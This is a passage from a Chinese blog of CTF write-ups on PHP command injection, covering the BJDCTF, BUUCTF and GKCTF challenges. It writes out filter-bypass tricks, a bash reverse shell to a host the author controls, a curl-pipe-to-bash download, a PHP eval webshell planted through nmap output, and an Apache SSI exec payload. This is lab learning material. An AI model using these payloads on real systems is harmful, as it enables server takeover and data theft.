    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">?</span><span class="token operator">></span> </code></pre>

<p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> fl* 利用*匹配任意 不行
<span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IGZsYWcucGhw"</span><span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">bash</span> 也不行
ca<span class="token punctuation">\</span>t fl<span class="token punctuation">\</span>ag.php 不行
<span class="token function">cat</span> fl<span class="token string">''</span>ag.php 不行</code></pre>

<p>最后使用变量拼接：</p>
<p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p>
<p>利用到解题中：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">a</span><span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span>.php</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt loading="lazy"></p>
<p>[・_・?]</p>
<p>F12即可得出答案：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt loading="lazy"></p>
<p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333">ping</a></p>
<h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="BJDCTF-2nd-duangShell"></a>BJDCTF-2nd-duangShell</h3><p>首先首页提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt loading="lazy"></p>
<p>.swp源码泄露，是使用vim编辑器的缓存文件</p>
<p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>give me a girl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>珍爱网<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"how can i give you source code? .swp?!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"where is P3rh4ps's girl friend ???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$girl</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\>|\\\/'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'just girl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='img/p3_need_beautiful_gf.png'> &lt;!-- He is p3 -->"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//duangShell~~~~</span>
        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>代码审计，可以POST一个<code>girl_friend</code>参数但过滤了一些参数，看到最后执行命令使用的是<code>exec</code>的函数，返回最后一行内容，无回显，由于看不到输出，就选择反弹shell来拿到系统权限执行命令。</p>
<p>正好<code>curl</code>命令没用被禁，<a href="https://www.cnblogs.com/yanguhung/p/10115911.html">curl命令参考</a>，于是选择用<code>curl</code>指令来curl远程主机上的文件然后再用管道符<code>| bash</code>来执行<code>curl</code>下来的内容</p>
<p>由于<code>buu</code>上面的靶机无法访问外网，创个小号开台可以用的靶机（靶机已经装好了LAMP），由于都是在一个内网，所以靶机之间可以互相访问</p>
<p><code>ssh</code>登录<code>ssh -p 29722 root@node3.buuoj.cn</code></p>
<p>输入密码进去后在<code>/var/www/html</code>目录下创建一个<code>txt</code>文件，里面写上反弹shell的语句</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/174.1.143.177/2333 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>

<p>注意上面的ip地址为内网的ip，提前用ifconfig查看一下内网ip就可以了，</p>
<p>然后在需要反弹shell的机子上post参数：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">girl_friend</span><span class="token operator">=</span>curl <span class="token number">174.1</span>.143.177/1.txt <span class="token operator">|</span> <span class="token function">bash</span></code></pre>

<p>可以看到shell被弹过来了，然后开始找flag</p>
<p>在根目录下有一个flag文件，但里面放的不是flag，于是find+grep查找</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> etc -name <span class="token string">"*"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"flag&#123;"</span></code></pre>

<p><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs</a>，最终在<code>etc</code>中找到了flag</p>
<p>关于反弹shell的解析参考以下文章</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>   （Linux反弹shell（一）文件描述符与重定向）</p>
<p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>   （Linux 反弹shell（二）反弹shell的本质）</p>
<p><a href="https://www.cnblogs.com/-zhong/p/11398877.html">https://www.cnblogs.com/-zhong/p/11398877.html</a>   （Liunx反弹shell的几种方式）</p>
</blockquote>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF-2018-Online Tool"></a>BUUCTF-2018-Online Tool</h3><p>首页源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>可以<code>get</code>一个<code>host</code></p>
<ul>
<li><strong>escapeshellarg</strong>：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li>
<li><strong>escapeshellcmd</strong>：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： <code>*</code> <code>&amp;</code> <code>#</code> <code>;</code> <code>|</code> <code>\</code> <code>*</code> <code>?</code> <code>~</code> <code>&lt;</code> <code>&gt;</code> <code>^</code> <code>(</code> <code>)</code> <code>[</code> <code>]</code> <code>&#123;</code> <code>&#125;</code> <code>$</code>  <code>*</code> <code>,</code> <code>\x0A</code> 和 <code>\xFF</code>。<code>&#39;</code>和<code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</li>
</ul>
<p>假设传入<code>172.17.0.2&#39; aaa</code>，结果<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; aaa&#39;</code>,在单引号前加了一个反斜杠转义，然后又将转义后单引号两边的字符串用引号引起来起到连接字符串的作用，随后经过<code>escapeshellcmd</code>处理变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; aaa&#39;</code>，<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，后面的<code>&#39;</code>配对成了一个空白连接符，如果是<code>ping</code>命令，则命令简化成了<code>ping 172.17.0.2\ aaa&#39;</code>，最终就会造成利用</p>
<p>于是我们配合<code>nmap</code>的<code>-oG</code>参数可以将扫描的结果生成指定的文件</p>
<p><code>payload</code>：<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
<h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="GKCTF2020-CheckIN"></a>GKCTF2020-CheckIN</h3><p>首先题目给出了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Check_In<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ClassName</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>可以看到已经相当于有一个马在上面了， <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p>
<p>于是直接用蚁剑连接：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111558751.png" alt loading="lazy"></p>
<p>注意这里自带的base64解码好像用不了，在网上找一个可以用的，<a href="https://github.com/AntSwordProject/AwesomeEncoder/blob/master/php/encoder/b64pass.js">链接</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525111835994.png" alt loading="lazy"></p>
<p>添加到<code>AntSword</code>即可连接成功</p>
<p>虽然连上去了，也可以看到根目录下的flag，但是并没有权限直接读取flag，但是我们可以看到有一个readflag可执行文件，应该就是想办法利用这个文件来读取flag了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt loading="lazy"></p>
<p>然而我们并不能直接执行这个readflag文件，因为<strong>phpinfo</strong>中的<strong>disable_functions</strong>选项禁用了很多命令执行函数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt loading="lazy"></p>
<p>于是有要想办法bypass  disable_functions来执行命令了，在网站找到可以直接执行命令的exp：</p>
<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
<p>直接传到网站的tmp目录下，我们具有tmp目录所有权限，令exp中<code>pwn(&quot;/readflag&quot;);</code>再发包<code>include(&#39;/tmp/exploits.php&#39;);</code>经过base64编码后的数据，即可读到flag</p>
<h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>要点-&gt;<strong>Apache SSI 远程命令执行漏洞</strong></p>
<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=”id” --&gt;</code>语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
<p>index.php.swp源码泄露，访问得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
		<span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span>
		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">**</span><span class="token operator">*</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>
            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'
            ***
            ***
            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>
            ***
			***'</span><span class="token punctuation">;</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">**</span><span class="token operator">*</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>
            
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
	<span class="token operator">**</span><span class="token operator">*</span>
    <span class="token punctuation">&#125;</span>
	<span class="token operator">**</span><span class="token operator">*</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>首先需要绕过<code>if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))</code></p>
<p>写个简单的脚本</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>得到一个<code>2020666</code>，拿去发包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200808171429367.png" alt="image-20200808171429367" loading="lazy"></p>
<p>得到路径</p>
<p>于是利用<strong>Apache SSI 远程命令执行漏洞</strong></p>
<p>payload：<code>username=&lt;!--#exec cmd=&quot;cd ..;cat flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</code></p>
<p>访问shtml文件即可得到flag</p>
